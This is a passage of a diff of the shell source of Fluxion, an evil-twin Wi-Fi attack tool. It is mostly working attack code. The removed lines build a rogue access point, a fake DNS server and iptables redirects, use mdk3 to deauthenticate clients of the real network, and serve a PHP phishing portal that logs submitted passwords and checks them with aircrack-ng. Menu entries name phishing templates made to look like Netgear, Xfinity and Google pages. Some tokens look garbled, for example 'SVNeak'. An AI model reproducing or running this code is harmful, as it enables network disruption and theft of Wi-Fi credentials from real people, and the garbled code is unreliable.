-                                DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_DAN
-                                DIALOG_WEB_DIR=$DIALOG_WEB_DIR_DAN
-                                NEUTRA
-                                break
-
-                        elif [ "$webconf" = 22 ]; then
-                                DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_HE
-                                DIALOG_WEB_INFO=$DIALOG_WEB_INFO_HE
-                                DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_HE
-                                DIALOG_WEB_OK=$DIALOG_WEB_OK_HE
-                                DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_HE
-                                DIALOG_WEB_BACK=$DIALOG_WEB_BACK_HE
-                                DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_HE
-                                DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_HE
-                                DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_HE
-                                DIALOG_WEB_DIR=$DIALOG_WEB_DIR_HE
-                                NEUTRA
-                                break
-
-                        elif [ "$webconf" = 23 ]; then
-                                DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_TH
-                                DIALOG_WEB_INFO=$DIALOG_WEB_INFO_TH
-                                DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_TH
-                                DIALOG_WEB_OK=$DIALOG_WEB_OK_TH
-                                DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_TH
-                                DIALOG_WEB_BACK=$DIALOG_WEB_BACK_TH
-                                DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_TH
-                                DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_TH
-                                DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_TH
-                                DIALOG_WEB_DIR=$DIALOG_WEB_DIR_TH
-                                NEUTRA
-                                break
-
-            elif [ "$webconf" = 24 ]; then
-                                DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_PT_BR
-                                DIALOG_WEB_INFO=$DIALOG_WEB_INFO_PT_BR
-                                DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_PT_BR
-                                DIALOG_WEB_OK=$DIALOG_WEB_OK_PT_BR
-                                DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_
-                                DIALOG_WEB_BACK=$DIALOG_WEB_BACK_
-                                DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_
-                                DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_PT_BR
-                                DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_PT_BR
-                                DIALOG_WEB_DIR=$DIALOG_WEB_DIR_PT_BR
-                                NEUTRA
-                                break
-
-            elif [ "$webconf" = 25 ]; then
-                                DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_PT_SVN
-                                DIALOG_WEB_INFO=$DIALOG_WEB_INFO_PT_SVN
-                                DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_PT_SVN
-                                DIALOG_WEB_OK=$DIALOG_WEB_OK_PT_SVN
-                                DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_
-                                DIALOG_WEB_BACK=$DIALOG_WEB_BACK_
-                                DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_
-                                DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_PT_SVN
-                                DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_PT_SVN
-                                DIALOG_WEB_DIR=$DIALOG_WEB_DIR_PT_SVN
-                                NEUTRA
-                                SVNeak
-
-                        elif [ "$webconf" = "26" ]; then
-                                BELKIN
-                                break
-
-
-                        elif [ "$webconf" = "27" ]; then
-                                NETGEAR
-                                break
-
-                        elif [ "$webconf" = "28" ]; then
-                                HUAWEI
-                                break
-
-                        elif [ "$webconf" = "29" ]; then
-                                VERIZON
-                                break
-
-                        elif [ "$webconf" = "30" ]; then
-                                NETGEAR2
-                                break
-
-                        elif [ "$webconf" = "31" ]; then
-                                ARRIS2
-                                break
-
-                        elif [ "$webconf" = "32" ]; then
-                                VODAFONE
-                                break
-
-                        elif [ "$webconf" = "33" ]; then
-                                TPLINK
-                                break
-
-                        elif [ "$webconf" = "34" ]; then
-                                ZIGGO_NL
-                                break
-
-                        elif [ "$webconf" = "35" ]; then
-                                KPN_NL
-                                break
-
-            elif [ "$webconf" = "36" ]; then
-                ZIGGO2016_NL
-                break
-
-                elif [ "$webconf" = "37" ]; then
-                                FRITZBOX_DE
-                                break
-
-                    elif [ "$webconf" = "38" ]; then
-                                FRITZBOX_ENG
-                                break
-
-                        elif [ "$webconf" = "39" ]; then
-                                GENEXIS_DE
-                                break
-
-                        elif [ "$webconf" = "40" ]; then
-                                Login-Netgear
-                                break
-
-                        elif [ "$webconf" = "41" ]; then
-                                Login-Xfinity
-                                break
-
-                        elif [ "$webconf" = "42" ]; then
-                                Telekom
-                                break
-
-                        elif [ "$webconf" = "43" ]; then
-                                google
-                                break
-
-      elif [ "$webconf" = "44" ]; then
-        MOVISTAR_ES
-        break
-
-                        elif [ "$webconf" = "45" ]; then
-                                conditional_clear
-                                webinterface
-                                break
+fluxion_do_sequence() {
+  if [ ${#@} -ne 2 ]; then return 1; fi
+
+  # TODO: Implement an alternative, better method of doing
+  # what this subroutine does, maybe using for-loop iteFLUXIONWindowRation.
+  # The for-loop implementation must support the subroutines
+  # defined above, including updating the namespace tracker.
+
+  local -r __fluxion_do_sequence__namespace=$1
+
+  # Removed read-only due to local constant shadowing bug.
+  # I've reported the bug, we can add it when fixed.
+  local __fluxion_do_sequence__sequence=("${!2}")
+
+  if [ ${#__fluxion_do_sequence__sequence[@]} -eq 0 ]; then
+    return -2
+  fi
+
+  local -A __fluxion_do_sequence__index=()
+
+  local i
+  for i in $(seq 0 $((${#__fluxion_do_sequence__sequence[@]} - 1))); do
+    __fluxion_do_sequence__index["${__fluxion_do_sequence__sequence[i]}"]=$i
+  done
+
+  # Start sequence with the first instruction available.
+  local __fluxion_do_sequence__instructionIndex=0
+  local __fluxion_do_sequence__instruction=${__fluxion_do_sequence__sequence[0]}
+  while [ "$__fluxion_do_sequence__instruction" ]; do
+    if ! fluxion_do $__fluxion_do_sequence__namespace $__fluxion_do_sequence__instruction; then
+      if ! fluxion_undo $__fluxion_do_sequence__namespace; then
+        return -2
       fi
 
-        done
-fi
-        preattack
-        attack
+      # Synchronize the current instruction's index by checking last.
+      if ! fluxion_done $__fluxion_do_sequence__namespace; then
+        return -3;
+      fi
+
+      __fluxion_do_sequence__instructionIndex=${__fluxion_do_sequence__index["$FluxionDone"]}
+
+      if [ ! "$__fluxion_do_sequence__instructionIndex" ]; then
+        return -4
+      fi
+    else
+      let __fluxion_do_sequence__instructionIndex++
+    fi
+
+    __fluxion_do_sequence__instruction=${__fluxion_do_sequence__sequence[$__fluxion_do_sequence__instructionIndex]}
+    echo "Running next: $__fluxion_do_sequence__instruction" \
+      > $FLUXIONOutputDevice
+  done
 }
 
-# Create different settings required for the script
-function preattack {
 
-        # Config HostAPD
-        echo "interface=$WIFI
-driver=nl80211
-ssid=$Host_SSID
-channel=$Host_CHAN" > $DUMP_PATH/hostapd.conf
+# ============================================================ #
+# ================= < Load All Subroutines > ================= #
+# ============================================================ #
+fluxion_header() {
+  format_apply_autosize "[%*s]\n"
+  local verticalBorder=$FormatApplyAutosize
 
-        # Creates PHP
-        echo "<?php
-error_reporting(0);
+  format_apply_autosize "[%*s${CSRed}FLUXION $FLUXIONVersion${CSWht}.${CSBlu}$FLUXIONRevision$CSRed    <$CIRed F${CIYel}luxion$CIRed I${CIYel}s$CIRed T${CIYel}he$CIRed F${CIYel}uture$CClr$CSYel >%*s$CSBlu]\n"
+  local headerTextFormat="$FormatApplyAutosize"
 
-\$count_my_page = (\"$DUMP_PATH/hit.txt\");
-\$hits = file(\$count_my_page);
-\$hits[0] ++;
-\$fp = fopen(\$count_my_page , \"w\");
-fputs(\$fp , \$hits[0]);
-fclose(\$fp);
+  fluxion_conditional_clear
 
-// Receive form Post data and Saving it in variables
-\$key1 = @\$_POST['key1'];
-
-// Write the name of text file where data will be store
-\$filename = \"$DUMP_PATH/data.txt\";
-\$filename2 = \"$DUMP_PATH/status.txt\";
-\$intento = \"$DUMP_PATH/intento\";
-\$attemptlog = \"$DUMP_PATH/pwattempt.txt\";
-
-// Marge all the variables with text in a single variable.
-\$f_data= ''.\$key1.'';
-
-\$pwlog = fopen(\$attemptlog, \"w\");
-fwrite(\$pwlog, \$f_data);
-fwrite(\$pwlog,\"\n\");
-fclose(\$pwlog);
-
-\$file = fopen(\$filename, \"w\");
-fwrite(\$file, \$f_data);
-fwrite(\$file,\"\n\");
-fclose(\$file);
-
-\$archivo = fopen(\$intento, \"w\");
-fwrite(\$archivo,\"\n\");
-fclose(\$archivo);
-
-while( 1 ) {
-
-        if (file_get_contents( \$intento ) == 1) {
-                header(\"Location:error.html\");
-                unlink(\$intento);
-            break;
-        }
-
-        if (file_get_contents( \$intento ) == 2) {
-                header(\"Location:final.html\");
-                break;
-        }
-
-        sleep(1);
-}
-?>" > $DUMP_PATH/data/check.php
-
-        # Config DHCP
-        echo "authoritative;
-
-default-lease-time 600;
-max-lease-time 7200;
-
-subnet $RANG_IP.0 netmask 255.255.255.0 {
-
-option broadcast-address $RANG_IP.255;
-option routers $IP;
-option subnet-mask 255.255.255.0;
-option domain-name-servers $IP;
-
-range $RANG_IP.100 $RANG_IP.250;
-
-}" > $DUMP_PATH/dhcpd.conf
-
-        #create an empty leases file
-        touch $DUMP_PATH/dhcpd.leases
-
-        # creates Lighttpd web-server
-        echo "server.document-root = \"$DUMP_PATH/data/\"
-
-  server.modules = (
-    \"mod_access\",
-    \"mod_alias\",
-    \"mod_accesslog\",
-    \"mod_fastcgi\",
-    \"mod_redirect\",
-    \"mod_rewrite\"
-  )
-
-  fastcgi.server = ( \".php\" => ((
-                  \"bin-path\" => \"/usr/bin/php-cgi\",
-                  \"socket\" => \"/php.socket\"
-                )))
-
-  server.port = 80
-  server.pid-file = \"/var/run/lighttpd.pid\"
-  # server.username = \"www\"
-  # server.groupname = \"www\"
-
-  mimetype.assign = (
-  \".html\" => \"text/html\",
-  \".htm\" => \"text/html\",
-  \".txt\" => \"text/plain\",
-  \".jpg\" => \"image/jpeg\",
-  \".png\" => \"image/png\",
-  \".css\" => \"text/css\"
-  )
-
-
-  server.error-handler-404 = \"/\"
-
-  static-file.exclude-extensions = ( \".fcgi\", \".php\", \".rb\", \"~\", \".inc\" )
-  index-file.names = ( \"index.htm\", \"index.html\" )
-
-  \$SERVER[\"socket\"] == \":443\" {
-        url.redirect = ( \"^/(.*)\" => \"http://www.internet.com\")
-        ssl.engine                  = \"enable\"
-        ssl.pemfile                 = \"$DUMP_PATH/server.pem\"
-
-  }
-
-  #Redirect www.domain.com to domain.com
-  \$HTTP[\"host\"] =~ \"^www\.(.*)$\" {
-        url.redirect = ( \"^/(.*)\" => \"http://%1/\$1\" )
-        ssl.engine                  = \"enable\"
-        ssl.pemfile                 = \"$DUMP_PATH/server.pem\"
-  }
-  " >$DUMP_PATH/lighttpd.conf
-
-
-# that redirects all DNS requests to the gateway
-        echo "import socket
-
-class DNSQuery:
-  def __init__(self, data):
-    self.data=data
-    self.dominio=''
-
-    tipo = (ord(data[2]) >> 3) & 15
-    if tipo == 0:
-      ini=12
-      lon=ord(data[ini])
-      while lon != 0:
-        self.dominio+=data[ini+1:ini+lon+1]+'.'
-        ini+=lon+1
-        lon=ord(data[ini])
-
-  def respuesta(self, ip):
-    packet=''
-    if self.dominio:
-      packet+=self.data[:2] + \"\x81\x80\"
-      packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'
-      packet+=self.data[12:]
-      packet+='\xc0\x0c'
-      packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'
-      packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.')))
-    return packet
-
-if __name__ == '__main__':
-  ip='$IP'
-  print 'pyminifakeDwebconfNS:: dom.query. 60 IN A %s' % ip
-
-  udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-  udps.bind(('',53))
-
-  try:
-    while 1:
-      data, addr = udps.recvfrom(1024)
-      p=DNSQuery(data)
-      udps.sendto(p.respuesta(ip), addr)
-      print 'Request: %s -> %s' % (p.dominio, ip)
-  except KeyboardInterrupt:
-    print 'Finalizando'
-    udps.close()" > $DUMP_PATH/fakedns
-        chmod +x $DUMP_PATH/fakedns
+  echo -e "$(printf "$CSRed$verticalBorder" "" | sed -r "s/ /~/g")"
+  printf "$CSRed$verticalBorder" ""
+  printf "$headerTextFormat" "" ""
+  printf "$CSBlu$verticalBorder" ""
+  echo -e "$(printf "$CSBlu$verticalBorder" "" | sed -r "s/ /~/g")$CClr"
+  echo
+  echo
 }
 
-# Set up DHCP / WEB server
-# Set up DHCP / WEB server
-function routear {
+# ======================= < Language > ======================= #
+fluxion_unset_language() {
+  FluxionLanguage=""
 
-        ifconfig $interfaceroutear up
-        ifconfig $interfaceroutear $IP netmask 255.255.255.0
-
-        route add -net $RANG_IP.0 netmask 255.255.255.0 gw $IP
-        sysctl -w net.ipv4.ip_forward=1 &>$flux_output_device
-
-  iptables --flush
-  iptables --table nat --flush
-  iptables --delete-chain
-  iptables --table nat --delete-chain
-  iptables -P FORWARD ACCEPT
-
-  iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $IP:80
-  iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $IP:443
-  iptables -A INPUT -p tcp --sport 443 -j ACCEPT
-  iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT
-  iptables -t nat -A POSTROUTING -j MASQUERADE
-
+  if [ "$FLUXIONPreferencesFile" ]; then
+    sed -i.backup "/FluxionLanguage=.\+/ d" "$FLUXIONPreferencesFile"
+  fi
 }
 
-# Attack
-function attack {
+fluxion_set_language() {
+  if [ ! "$FluxionLanguage" ]; then
+    # Get all languages available.
+    local languageCodes
+    readarray -t languageCodes < <(ls -1 language | sed -E 's/\.sh//')
 
-        interfaceroutear=$WIFI
+    local languages
+    readarray -t languages < <(
+      head -n 3 language/*.sh |
+      grep -E "^# native: " |
+      sed -E 's/# \w+: //'
+    )
 
-        handshakecheck
-        nomac=$(tr -dc A-F0-9 < /dev/urandom | fold -w2 |head -n100 | grep -v "${mac:13:1}" | head -c 1)
+    io_query_format_fields "$FLUXIONVLine Select your language" \
+      "\t$CRed[$CSYel%d$CClr$CRed]$CClr %s / %s\n" \
+      languageCodes[@] languages[@]
 
-        if [ "$fakeapmode" = "hostapd" ]; then
+    FluxionLanguage=${IOQueryFormatFields[0]}
 
-                ifconfig $WIFI down
-                sleep 0.4
-                macchanger --mac=${mac::13}$nomac${mac:14:4} $WIFI &> $flux_output_device
-                sleep 0.4
-                ifconfig $WIFI up
-                sleep 0.4
-        fi
+    echo # Do not remove.
+  fi
+
+  # Check if all language files are present for the selected language.
+  find -type d -name language | while read language_dir; do
+    if [ ! -e "$language_dir/${FluxionLanguage}.sh" ]; then
+      echo -e "$FLUXIONVLine ${CYel}Warning${CClr}, missing language file:"
+      echo -e "\t$language_dir/${FluxionLanguage}.sh"
+      return 1
+    fi
+  done
+
+  if [ $? -eq 1 ]; then # If a file is missing, fall back to english.
+    echo -e "\n\n$FLUXIONVLine Falling back to English..."; sleep 5
+    FluxionLanguage="en"
+  fi
+
+  source "$FLUXIONPath/language/$FluxionLanguage.sh"
+
+  if [ "$FLUXIONPreferencesFile" ]; then
+    if more $FLUXIONPreferencesFile | \
+      grep -q "FluxionLanguage=.\+" &> /dev/null; then
+      sed -r "s/FluxionLanguage=.+/FluxionLanguage=$FluxionLanguage/g" \
+      -i.backup "$FLUXIONPreferencesFile"
+    else
+      echo "FluxionLanguage=$FluxionLanguage" >> "$FLUXIONPreferencesFile"
+    fi
+  fi
+}
+
+# ====================== < Interfaces > ====================== #
+declare -A FluxionInterfaces=() # Global interfaces' registry.
+
+fluxion_deallocate_interface() { # Release interfaces
+  if [ ! "$1" ] || ! interface_is_real $1; then return 1; fi
+
+  local -r oldIdentifier=$1
+  local -r newIdentifier=${FluxionInterfaces[$oldIdentifier]}
+
+  # Assure the interface is in the allocation table.
+  if [ ! "$newIdentifier" ]; then return 2; fi
+
+  local interfaceIdentifier=$newIdentifier
+  echo -e "$CWht[$CSRed-$CWht] "$(
+    io_dynamic_output "$FLUXIONDeallocatingInterfaceNotice"
+  )"$CClr"
+
+  if interface_is_wireless $oldIdentifier; then
+    # If interface was allocated by airmon-ng, deallocate with it.
+    if [[ "$oldIdentifier" == *"mon"* || "$oldIdentifier" == "prism"* ]]; then
+      if ! airmon-ng stop $oldIdentifier &> $FLUXIONOutputDevice; then
+        return 4
+      fi
+    else
+      # Attempt deactivating monitor mode on the interface.
+      if ! interface_set_mode $oldIdentifier managed; then
+        return 3
+      fi
+
+      # Attempt to restore the original interface identifier.
+      if ! interface_reidentify "$oldIdentifier" "$newIdentifier"; then
+        return 5
+      fi
+    fi
+  fi
+
+  # Once successfully renamed, remove from allocation table.
+  unset FluxionInterfaces[$oldIdentifier]
+  unset FluxionInterfaces[$newIdentifier]
+}
+
+# Parameters: <interface_identifier>
+# ------------------------------------------------------------ #
+# Return 1: No interface identifier was passed.
+# Return 2: Interface identifier given points to no interface.
+# Return 3: Unable to determine interface's driver.
+# Return 4: Fluxion failed to reidentify interface.
+# Return 5: Interface allocation failed (identifier missing).
+fluxion_allocate_interface() { # Reserve interfaces
+  if [ ! "$1" ]; then return 1; fi
+
+  local -r identifier=$1
+
+  # If the interface is already in allocation table, we're done.
+  if [ "${FluxionInterfaces[$identifier]+x}" ]; then
+    return 0
+  fi
+
+  if ! interface_is_real $identifier; then return 2; fi
 
 
-        if [ $fakeapmode = "hostapd" ]; then
-                killall hostapd &> $flux_output_device
-                xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "AP" -e hostapd $DUMP_PATH/hostapd.conf &
-                elif [ $fakeapmode = "airbase-ng" ]; then
-                killall airbase-ng &> $flux_output_device
-                xterm $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "AP" -e airbase-ng -P -e $Host_SSID -c $Host_CHAN -a ${mac::13}$nomac${mac:14:4} $WIFI_MONITOR &
-        fi
-        sleep 5
+  local interfaceIdentifier=$identifier
+  echo -e "$CWht[$CSGrn+$CWht] "$(
+    io_dynamic_output "$FLUXIONAllocatingInterfaceNotice"
+  )"$CClr"
 
-        routear &
+
+  if interface_is_wireless $identifier; then
+    # Unblock wireless interfaces to make them available.
+    echo -e "$FLUXIONVLine $FLUXIONUnblockingWINotice"
+    rfkill unblock all &> $FLUXIONOutputDevice
+
+    if [ "$FLUXIONWIReloadDriver" ]; then
+      # Get selected interface's driver details/info-descriptor.
+      echo -e "$FLUXIONVLine $FLUXIONGatheringWIInfoNotice"
+
+      if ! interface_driver "$identifier"; then
+        echo -e "$FLUXIONVLine$CRed $FLUXIONUnknownWIDriverError"
         sleep 3
+        return 3
+      fi
 
+      # Notice: This local is function-scoped, not block-scoped.
+      local -r driver="$InterfaceDriver"
 
-        killall dhcpd &> $flux_output_device
-        fuser -n tcp -k 53 67 80 &> $flux_output_device
-        fuser -n udp -k 53 67 80 &> $flux_output_device
+      # Unload the driver module from the kernel.
+      rmmod -f $driver &> $FLUXIONOutputDevice
 
-        xterm -bg black -fg green $TOPLEFT -T DHCP -e "dhcpd -d -f -lf "$DUMP_PATH/dhcpd.leases" -cf "$DUMP_PATH/dhcpd.conf" $interfaceroutear 2>&1 | tee -a $DUMP_PATH/clientes.txt" &
-        xterm $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "FAKEDNS" -e "if type python2 >/dev/null 2>/dev/null; then python2 $DUMP_PATH/fakedns; else python $DUMP_PATH/fakedns; fi" &
+      # Wait while interface becomes unavailable.
+      echo -e "$FLUXIONVLine "$(
+        io_dynamic_output $FLUXIONUnloadingWIDriverNotice
+      )
+      while interface_physical "$identifier"; do
+        sleep 1
+      done
+    fi
 
-        lighttpd -f $DUMP_PATH/lighttpd.conf &> $flux_output_device
+    if [ "$FLUXIONWIKillProcesses" ]; then
+      # Get list of potentially troublesome programs.
+      echo -e "$FLUXIONVLine $FLUXIONFindingConflictingProcessesNotice"
 
-        killall aireplay-ng &> $flux_output_device
-        killall mdk3 &> $flux_output_device
-        echo "$Host_MAC" >$DUMP_PATH/mdk3.txt
-        xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauth all [mdk3]  $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
+      # Kill potentially troublesome programs.
+      echo -e "$FLUXIONVLine $FLUXIONKillingConflictingProcessesNotice"
 
-        xterm -hold $TOPRIGHT -title "Wifi Information" -e $DUMP_PATH/handcheck &
-        conditional_clear
+      # TODO: Make the loop below airmon-ng independent.
+      # Maybe replace it with a list of network-managers?
+      # WARNING: Version differences could break code below.
+      for program in "$(airmon-ng check | awk 'NR>6{print $2}')"; do
+        killall "$program" &> $FLUXIONOutputDevice
+      done
+    fi
 
-        while true; do
-                top
+    if [ "$FLUXIONWIReloadDriver" ]; then
+      # Reload the driver module into the kernel.
+      modprobe "$driver" &> $FLUXIONOutputDevice
 
-                echo -e ""$red"["$yellow"2"$red"]"$transparent" Attack in progress .."
-                echo "                                       "
-                echo "      1) Choose another network"
-                echo "      2) Exit"
-                echo " "
-                echo -n '      #> '
-                read yn
-                case $yn in
-                        1 ) matartodo; CSVDB=dump-01.csv; selection; break;;
-                        2 ) matartodo; exitmode; break;;
-                        * ) echo "
-$general_case_error"; conditional_clear ;;
-                esac
-        done
+      # Wait while interface becomes available.
+      echo -e "$FLUXIONVLine "$(
+        io_dynamic_output $FLUXIONLoadingWIDriverNotice
+      )
+      while ! interface_physical "$identifier"; do
+        sleep 1
+      done
+    fi
 
+    # Set wireless flag to prevent having to re-query.
+    local -r allocatingWirelessInterface=1
+  fi
+
+  # If we're using the interface library, reidentify now.
+  # If usuing airmon-ng, let airmon-ng rename the interface.
+  if [ ! $FLUXIONAirmonNG ]; then
+    echo -e "$FLUXIONVLine $FLUXIONReidentifyingInterface"
+
+    # Prevent interface-snatching by renaming the interface.
+    if [ $allocatingWirelessInterface ]; then
+      # Get next wireless interface to add to FluxionInterfaces global.
+      fluxion_next_assignable_interface fluxwl
+    else
+      # Get next ethernet interface to add to FluxionInterfaces global.
+      fluxion_next_assignable_interface fluxet
+    fi
+
+    interface_reidentify $identifier $FluxionNextAssignableInterface
+
+    if [ $? -ne 0 ]; then # If reidentifying failed, abort immediately.
+      return 4
+    fi
+  fi
+
+  if [ $allocatingWirelessInterface ]; then
+    # Activate wireless interface monitor mode and save identifier.
+    echo -e "$FLUXIONVLine $FLUXIONStartingWIMonitorNotice"
+
+    # TODO: Consider the airmon-ng flag is set, monitor mode is
+    # already enabled on the interface being allocated, and the
+    # interface identifier is something non-airmon-ng standard.
+    # The interface could already be in use by something else.
+    # Snatching or crashing interface issues could occur.
+
+    # NOTICE: Conditionals below populate newIdentifier on success.
+    if [ $FLUXIONAirmonNG ]; then
+      local -r newIdentifier=$(
+        airmon-ng start $identifier |
+        grep "monitor .* enabled" |
+        grep -oP "wl[a-zA-Z0-9]+mon|mon[0-9]+|prism[0-9]+"
+      )
+    else
+      # Attempt activating monitor mode on the interface.
+      if interface_set_mode $FluxionNextAssignableInterface monitor; then
+        # Register the new identifier upon consecutive successes.
+        local -r newIdentifier=$FluxionNextAssignableInterface
+      else
+        # If monitor-mode switch fails, undo rename and abort.
+        interface_reidentify $FluxionNextAssignableInterface $identifier
+      fi
+    fi
+  fi
+
+  # On failure to allocate the interface, we've got to abort.
+  # Notice: If the interface was already in monitor mode and
+  # airmon-ng is activated, WE didn't allocate the interface.
+  if [ ! "$newIdentifier" -o "$newIdentifier" = "$oldIdentifier" ]; then
+    echo -e "$FLUXIONVLine $FLUXIONInterfaceAllocationFailedError"
+    sleep 3
+    return 5
+  fi
+
+  # Register identifiers to allocation hash table.
+  FluxionInterfaces[$newIdentifier]=$identifier
+  FluxionInterfaces[$identifier]=$newIdentifier
+
+  echo -e "$FLUXIONVLine $FLUXIONInterfaceAllocatedNotice"
+  sleep 3
+
+  # Notice: Interfaces are accessed with their original identifier
+  # as the key for the global FluxionInterfaces hash/map/dictionary.
 }
 
-# Checks the validity of the password
-function handshakecheck {
+# Parameters: <interface_prefix>
+# Description: Prints next available assignable interface name.
+# ------------------------------------------------------------ #
+fluxion_next_assignable_interface() {
+  # Find next available interface by checking global.
+  local -r prefix=$1
+  local index=0
+  while [ "${FluxionInterfaces[$prefix$index]}" ]; do
+    let index++
+  done
+  FluxionNextAssignableInterface="$prefix$index"
+}
 
-        echo "#!/bin/bash
+# Parameters: <interfaces:lambda> [<query>]
+# Note: The interfaces lambda must print an interface per line.
+# ------------------------------------------------------------ #
+# Return -1: Go back
+# Return  1: Missing interfaces lambda identifier (not passed).
+fluxion_get_interface() {
+  if ! type -t "$1" &> /dev/null; then return 1; fi
 
-        echo > $DUMP_PATH/data.txt
-        echo -n \"0\"> $DUMP_PATH/hit.txt
-        echo "" >$DUMP_PATH/loggg
+  if [ "$2" ]; then
+    local -r interfaceQuery="$2"
+  else
+    local -r interfaceQuery=$FLUXIONInterfaceQuery
+  fi
 
-        tput civis
-        clear
+  while true; do
+    local candidateInterfaces
+    readarray -t candidateInterfaces < <($1)
+    local interfacesAvailable=()
+    local interfacesAvailableInfo=()
+    local interfacesAvailableColor=()
+    local interfacesAvailableState=()
 
-        minutos=0
-        horas=0
-        i=0
-        timestamp=\$(date +%s)
+    # Gather information from all available interfaces.
+    local candidateInterface
+    for candidateInterface in "${candidateInterfaces[@]}"; do
+      if [ ! "$candidateInterface" ]; then
+        local skipOption=1
+        continue
+      fi
 
-        while true; do
+      interface_chipset "$candidateInterface"
+      interfacesAvailableInfo+=("$InterfaceChipset")
 
-        segundos=\$i
-        dias=\`expr \$segundos / 86400\`
-        segundos=\`expr \$segundos % 86400\`
-        horas=\`expr \$segundos / 3600\`
-        segundos=\`expr \$segundos % 3600\`
-        minutos=\`expr \$segundos / 60\`
-        segundos=\`expr \$segundos % 60\`
+      # If it has already been allocated, we can use it at will.
+      local candidateInterfaceAlt=${FluxionInterfaces["$candidateInterface"]}
+      if [ "$candidateInterfaceAlt" ]; then
+        interfacesAvailable+=("$candidateInterfaceAlt")
 
-        if [ \"\$segundos\" -le 9 ]; then
-        is=\"0\"
+        interfacesAvailableColor+=("$CGrn")
+        interfacesAvailableState+=("[*]")
+      else
+        interfacesAvailable+=("$candidateInterface")
+
+        interface_state "$candidateInterface"
+
+        if [ "$InterfaceState" = "up" ]; then
+          interfacesAvailableColor+=("$CPrp")
+          interfacesAvailableState+=("[-]")
         else
-        is=
+          interfacesAvailableColor+=("$CClr")
+          interfacesAvailableState+=("[+]")
         fi
+      fi
+    done
 
-        if [ \"\$minutos\" -le 9 ]; then
-        im=\"0\"
-        else
-        im=
-        fi
+    # If only one interface exists and it's not unavailable, choose it.
+    if [ "${#interfacesAvailable[@]}" -eq 1 -a \
+      "${interfacesAvailableState[0]}" != "[-]" -a \
+      "$skipOption" == "" ]; then FluxionInterfaceSelected="${interfacesAvailable[0]}"
+      FluxionInterfaceSelectedState="${interfacesAvailableState[0]}"
+      FluxionInterfaceSelectedInfo="${interfacesAvailableInfo[0]}"
+      break
+    else
+      if [ $skipOption ]; then
+        interfacesAvailable+=("$FLUXIONGeneralSkipOption")
+        interfacesAvailableColor+=("$CClr")
+      fi
 
-        if [ \"\$horas\" -le 9 ]; then
-        ih=\"0\"
-        else
-        ih=
-        fi">>$DUMP_PATH/handcheck
+      interfacesAvailable+=(
+        "$FLUXIONGeneralRepeatOption"
+        "$FLUXIONGeneralBackOption"
+      )
 
-        if [ $authmode = "handshake" ]; then
-                echo "if [ -f $DUMP_PATH/pwattempt.txt ]; then
-                cat $DUMP_PATH/pwattempt.txt >> \"$PASSLOG_PATH/$Host_SSID-$Host_MAC.log\"
-                rm -f $DUMP_PATH/pwattempt.txt
-                fi
+      interfacesAvailableColor+=(
+        "$CClr"
+        "$CClr"
+      )
 
-                if [ -f $DUMP_PATH/intento ]; then
+      format_apply_autosize \
+        "$CRed[$CSYel%1d$CClr$CRed]%b %-8b %3s$CClr %-*.*s\n"
 
-                if ! aircrack-ng -w $DUMP_PATH/data.txt $DUMP_PATH/$Host_MAC-01.cap | grep -qi \"Passphrase not in\"; then
-                echo \"2\">$DUMP_PATH/intento
-                break
-                else
-                echo \"1\">$DUMP_PATH/intento
-                fi
+      io_query_format_fields \
+        "$FLUXIONVLine $interfaceQuery" "$FormatApplyAutosize" \
+        interfacesAvailableColor[@] interfacesAvailable[@] \
+        interfacesAvailableState[@] interfacesAvailableInfo[@]
 
-                fi">>$DUMP_PATH/handcheck
+      echo
 
-        elif [ $authmode = "wpa_supplicant" ]; then
-                  echo "
-                if [ -f $DUMP_PATH/pwattempt.txt ]; then
-                cat $DUMP_PATH/pwattempt.txt >> $PASSLOG_PATH/$Host_SSID-$Host_MAC.log
-                rm -f $DUMP_PATH/pwattempt.txt
-                fi
-
-                wpa_passphrase $Host_SSID \$(cat $DUMP_PATH/data.txt)>$DUMP_PATH/wpa_supplicant.conf &
-                wpa_supplicant -i$WIFI -c$DUMP_PATH/wpa_supplicant.conf -f $DUMP_PATH/loggg &
-
-                if [ -f $DUMP_PATH/intento ]; then
-
-                if grep -i 'WPA: Key negotiation completed' $DUMP_PATH/loggg; then
